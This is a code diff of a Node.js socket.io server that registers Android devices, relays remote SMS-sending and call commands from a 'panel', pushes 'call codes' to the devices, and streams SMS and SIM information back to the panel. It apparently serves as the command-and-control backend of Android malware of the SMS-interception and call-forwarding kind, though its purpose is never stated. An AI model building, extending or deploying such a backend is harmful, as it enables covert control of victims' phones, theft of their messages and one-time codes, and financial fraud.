@@ -25,9 +25,11 @@ connectDB();
 const app = express();
 const server = createServer(app);
 
-// → Long timeout fix (socket random disconnect issue)
+// ⭐ MOST IMPORTANT FIX FOR ANDROID
 const io = new Server(server, {
   cors: { origin: "*", methods: ["GET", "POST"] },
+  transports: ["polling", "websocket"], // REQUIRED
+  allowEIO3: true,                      // REQUIRED for Android
   pingInterval: 25000,
   pingTimeout: 60000,
   connectTimeout: 60000,
@@ -37,20 +39,18 @@ app.use(cors());
 app.use(express.json());
 app.set("io", io);
 
-// ===============================
+// ==================================================
 // DEVICE SOCKET MAP
-// ===============================
+// ==================================================
 const deviceSockets = new Map();
 
-// ===============================
-// SOCKET HANDLER
-// ===============================
+// ==================================================
+// SOCKET LOGIC
+// ==================================================
 io.on("connection", (socket) => {
   let currentDeviceId = null;
 
-  // --------------------------------
-  // REGISTER DEVICE
-  // --------------------------------
+  // DEVICE REGISTER
   socket.on("registerDevice", (uniqueid) => {
     if (!uniqueid) return;
 
@@ -60,29 +60,24 @@ io.on("connection", (socket) => {
     if (deviceSockets.has(uniqueid)) {
       const oldSocketId = deviceSockets.get(uniqueid);
       if (oldSocketId !== socket.id) {
-        console.log(`♻️ Updating socket for ${uniqueid} (old=${oldSocketId}, new=${socket.id})`);
+        console.log(`♻️ Updating socket for ${uniqueid}`);
       }
     }
 
     deviceSockets.set(uniqueid, socket.id);
     socket.join(uniqueid);
 
-    // online status
     saveLastSeen(uniqueid, "Online");
 
-    // confirm to device
     io.to(socket.id).emit("deviceRegistered", { uniqueid });
 
-    // notify panel for live list
     io.emit("deviceListUpdated", {
       event: "device_connected",
       uniqueid,
     });
   });
 
-  // --------------------------------
-  // DEVICE STATUS (Online / Offline / Charging / etc.)
-  // --------------------------------
+  // DEVICE STATUS
   socket.on("deviceStatus", (data) => {
     const { uniqueid, connectivity } = data || {};
     if (!uniqueid) return;
@@ -98,51 +93,43 @@ io.on("connection", (socket) => {
     });
   });
 
-  // --------------------------------
-  // PANEL → SEND SMS TO DEVICE
-  // --------------------------------
+  // SEND SMS COMMAND
   socket.on("sendSMS", (payload) => {
     if (!payload?.deviceId) return;
 
     const socketId = deviceSockets.get(payload.deviceId);
 
     if (socketId && io.sockets.sockets.get(socketId)) {
-      console.log(`📨 Sending SMS command to device: ${payload.deviceId}`);
+      console.log(`📨 SMS → ${payload.deviceId}`);
       io.to(socketId).emit("smsCommand", payload);
     } else {
       console.log(`⚠️ Device offline for SMS: ${payload.deviceId}`);
     }
   });
 
-  // --------------------------------
-  // PANEL → CALL COMMAND TO DEVICE
-  // --------------------------------
+  // CALL COMMAND
   socket.on("callDevice", (payload) => {
     if (!payload?.deviceId) return;
 
     const socketId = deviceSockets.get(payload.deviceId);
 
     if (socketId && io.sockets.sockets.get(socketId)) {
-      console.log(`📞 Call command → ${payload.deviceId}`);
+      console.log(`📞 Call → ${payload.deviceId}`);
       io.to(socketId).emit("callCommand", payload);
     } else {
       console.log(`⚠️ Device offline for Call: ${payload.deviceId}`);
     }
   });
 
-  // --------------------------------
   // DISCONNECT
-  // --------------------------------
   socket.on("disconnect", () => {
     if (!currentDeviceId) return;
 
     console.log(`🔴 DISCONNECTED: ${currentDeviceId}`);
 
-    // thoda wait karo, shayad auto-reconnect ho jaye
     setTimeout(() => {
       const still = deviceSockets.get(currentDeviceId);
 
-      // agar already naya socket aa gaya to offline mat karo
       if (!still || still !== socket.id) return;
 
       deviceSockets.delete(currentDeviceId);
@@ -164,9 +151,9 @@ io.on("connection", (socket) => {
   });
 });
 
-// ===============================
+// ==================================================
 // HELPERS
-// ===============================
+// ==================================================
 async function saveLastSeen(deviceId, connectivity) {
   try {
     const PORT = process.env.PORT || 5000;
@@ -181,7 +168,7 @@ async function saveLastSeen(deviceId, connectivity) {
   }
 }
 
-// 🔥 EXPORT YAHI HAI – callController yahi use karega
+// EXPORT FOR CONTROLLERS
 export async function sendCallCodeToDevice(uid, callData) {
   try {
     const socketId = deviceSockets.get(uid);
@@ -196,13 +183,13 @@ export async function sendCallCodeToDevice(uid, callData) {
   }
 }
 
-// ===============================
+// ==================================================
 // DB WATCHERS
-// ===============================
+// ==================================================
 mongoose.connection.once("open", () => {
-  console.log("📡 Watching MongoDB Collections");
+  console.log("📡 Watching MongoDB...");
 
-  // --- SMS WATCH ---
+  // SMS
   mongoose.connection
     .collection("sms")
     .watch()
@@ -217,12 +204,11 @@ mongoose.connection.once("open", () => {
 
       const socketId = deviceSockets.get(sms.deviceId);
       if (socketId && io.sockets.sockets.get(socketId)) {
-        console.log("📩 New SMS → sending to device", sms.deviceId);
         io.to(socketId).emit("smsUpdate", sms);
       }
     });
 
-  // --- CALLCODES WATCH ---
+  // CALLCODES
   mongoose.connection
     .collection("callcodes")
     .watch()
@@ -235,11 +221,10 @@ mongoose.connection.once("open", () => {
 
       if (!updated?.deviceId) return;
 
-      // yaha bhi same helper use karenge
       await sendCallCodeToDevice(updated.deviceId, updated);
     });
 
-  // --- SIMINFO WATCH ---
+  // SIMINFO
   mongoose.connection
     .collection("siminfos")
     .watch()
@@ -248,12 +233,12 @@ mongoose.connection.once("open", () => {
         .collection("siminfos")
         .findOne({ _id: chg.documentKey._id });
 
-      if (!updated) return;
-
-      io.emit("simInfoUpdated", { sim: updated });
+      if (updated) {
+        io.emit("simInfoUpdated", { sim: updated });
+      }
     });
 
-  // --- DEVICES WATCH ---
+  // DEVICES
   mongoose.connection
     .collection("devices")
     .watch()
@@ -262,18 +247,18 @@ mongoose.connection.once("open", () => {
         .collection("devices")
         .findOne({ _id: chg.documentKey._id });
 
-      if (!updated) return;
-
-      io.emit("deviceListUpdated", {
-        event: "db_change",
-        device: updated,
-      });
+      if (updated) {
+        io.emit("deviceListUpdated", {
+          event: "db_change",
+          device: updated,
+        });
+      }
     });
 });
 
-// ===============================
+// ==================================================
 // ROUTES
-// ===============================
+// ==================================================
 app.get("/", (req, res) => res.send("Server Running"));
 
 app.use("/api/device", deviceRoutes);
@@ -287,9 +272,9 @@ app.use("/api/status", statusRoutes);
 app.use("/api/lastseen", lastSeenRoutes);
 app.use("/api/call-log", callLogRoutes);
 
-// ===============================
+// ==================================================
 // START SERVER
-// ===============================
+// ==================================================
 const PORT = process.env.PORT || 5000;
 server.listen(PORT, () => {
   console.log(`🚀 SERVER LIVE → http://localhost:${PORT}`);
